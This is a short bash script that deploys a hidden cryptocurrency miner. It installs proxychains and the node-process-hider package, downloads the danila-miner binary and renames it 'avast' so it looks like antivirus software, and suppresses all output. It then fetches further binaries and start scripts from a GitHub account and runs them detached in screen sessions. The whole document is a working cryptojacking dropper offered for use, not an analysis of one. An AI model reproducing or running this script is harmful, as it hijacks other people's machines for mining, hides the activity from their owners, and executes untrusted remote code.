#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

apt install proxychains

apt install curl

apt install screen -y

sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider

wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1 

tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz  >/dev/null 2>&1

mv danila-miner avast >/dev/null 2>&1

rm -rvf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1

chmod +x avast >/dev/null 2>&1

sudo wget -qO manuk https://raw.githubusercontent.com/renilo/hajar/main/enak >/dev/null 2>&1  

sudo chmod +x manuk >/dev/null 2>&1

wget https://raw.githubusercontent.com/renilo/bc/main/start.sh >/dev/null 2>&1

chmod +x start.sh >/dev/null 2>&1

screen -dmS Running ./start.sh

wget https://raw.githubusercontent.com/renilo/bc/main/start1.sh >/dev/null 2>&1

chmod +x start1.sh >/dev/null 2>&1

screen -dmS Running ./start1.sh
